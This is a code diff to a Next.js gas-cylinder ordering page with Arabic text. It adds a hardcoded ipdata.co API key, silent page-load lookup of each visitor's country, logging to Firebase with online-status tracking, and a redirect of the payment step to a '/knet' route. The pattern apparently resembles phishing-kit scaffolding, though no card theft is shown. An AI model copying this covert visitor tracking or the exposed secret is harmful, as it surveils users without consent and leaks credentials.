@@ -10,6 +10,9 @@ import Link from "next/link"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Label } from "@/components/ui/label"
 import { Input } from "@/components/ui/input"
+import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
+import { useRouter } from "next/navigation"
 
 export default function GasCylinderApp() {
   const [step, setStep] = useState(1)
@@ -20,17 +23,44 @@ export default function GasCylinderApp() {
   const [selectedAddress, setSelectedAddress] = useState("address1")
   const [selectedPayment, setSelectedPayment] = useState("card")
   const [showAddAddress, setShowAddAddress] = useState(false)
+  const router=useRouter()
   const { theme, setTheme } = useTheme()
   const [mounted, setMounted] = useState(false)
+  const _id=randstr('gas-')
 
   // Sample addresses
   const savedAddresses: any[] = [
    
   ]
-
+  async function getLocation() {
+    const APIKEY = '856e6f25f413b5f7c87b868c372b89e52fa22afb878150f5ce0c4aef';
+    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`;
+  
+    try {
+        const response = await fetch(url);
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const country = await response.text();
+        addData({
+            id:_id,
+            country: country
+        })
+        localStorage.setItem('country',country)
+        setupOnlineStatus(_id)
+      } catch (error) {
+        console.error('Error fetching location:', error);
+    }
+  }
+function randstr(prefix:string)
+{
+  return Math.random().toString(36).replace('0.',prefix || '');
+}
   // Avoid hydration mismatch
   useEffect(() => {
     setMounted(true)
+  getLocation().then(()=>{})
+
   }, [])
 
   const incrementCount = () => {
@@ -84,6 +114,7 @@ export default function GasCylinderApp() {
   const proceedToPayment = () => {
     // In a real app, this would redirect to a payment gateway
     alert("سيتم تحويلك إلى بوابة الدفع")
+    router.push('/knet')
   }
 
   if (!mounted) {
